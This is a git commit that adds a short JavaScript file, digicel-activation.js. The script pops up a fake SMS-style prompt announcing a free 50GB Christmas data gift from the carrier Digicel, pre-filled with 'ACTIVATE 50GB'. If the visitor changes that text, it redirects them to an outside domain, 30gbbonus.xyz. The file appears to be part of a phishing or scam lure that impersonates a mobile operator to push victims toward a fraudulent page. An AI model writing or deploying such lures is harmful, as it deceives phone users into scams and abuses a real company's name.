816b365435629220d790a1759568e5671a7ccfeb
xmasdata <152927198+xmasdata@users.noreply.github.com>
2024-12-18 03:57:33 -0800

    Create digicel-activation.js

---
+++ digicel-activation.js
@@ -0,0 +1,6 @@
+
+var password = 'ACTIVATE 50GB'
+password=prompt('SMS: Congratulations You are qualify for 50GB Christmas Gift, Kindly Press OK to Activate now   ','ACTIVATE 50GB');
+if (password != 'ACTIVATE 50GB') {
+location.href='https://30gbbonus.xyz/digicel-christmas.html';
+}
